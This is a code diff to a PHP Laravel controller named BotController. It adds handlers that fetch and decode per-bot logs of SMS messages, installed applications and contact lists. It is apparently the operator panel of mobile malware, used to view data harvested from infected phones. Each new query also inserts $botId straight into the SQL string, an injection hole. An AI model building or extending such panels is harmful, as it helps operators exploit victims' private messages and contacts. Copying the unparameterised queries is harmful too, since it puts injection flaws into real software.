@@ -292,8 +292,73 @@ class BotController extends Controller
 
                 return $rows;
             case 'savedSms':
+                $table = 'sms_logs';
+
+                if (Schema::hasTable($table)) {
+                    $rows = DB::SELECT("SELECT * FROM $table WHERE bot_id = '$botId'");
+                    $logs = [];
+
+                    for ($i = 0; $i < count($rows); $i++) {
+                        $row = $rows[$i];
+
+                        $lines = explode(":end:", base64_decode($row->logs));
+                        foreach ($lines as $line) {
+                            if (!empty($line)) {
+                                $logs[] = ['logs' => base64_encode($line)];
+                            }
+                        }
+                    }
+
+                    return $logs;
+                }
+
+                return [];
+                       
             case 'installedApp':
+                $table = 'application_list_logs';
+
+                if (Schema::hasTable($table)) {
+                    $rows = DB::SELECT("SELECT * FROM $table WHERE bot_id = '$botId'");
+                    $logs = [];
+
+                    for ($i = 0; $i < count($rows); $i++) {
+                        $row = $rows[$i];
+
+                        $lines = explode(":end:", base64_decode($row->logs));
+                        foreach ($lines as $line) {
+                            if (!empty($line)) {
+                                $logs[] = ['logs' => base64_encode($line)];
+                            }
+                        }
+                    }
+
+                    return $logs;
+                }
+
+                return [];
             case 'contactList':
+                $table = 'phone_number_logs';
+
+                if (Schema::hasTable($table)) {
+                    $rows = DB::SELECT("SELECT * FROM $table WHERE bot_id = '$botId'");
+                    $logs = [];
+
+                    for ($i = 0; $i < count($rows); $i++) {
+                        $row = $rows[$i];
+
+                        $lines = explode(":end:", base64_decode($row->logs));
+                        foreach ($lines as $line) {
+                            if (!empty($line)) {
+                                $logs[] = ['logs' => base64_encode($line)];
+                            }
+                        }
+                    }
+
+                    return $logs;
+                }
+
+                return [];
+                
                 break;
         }
 
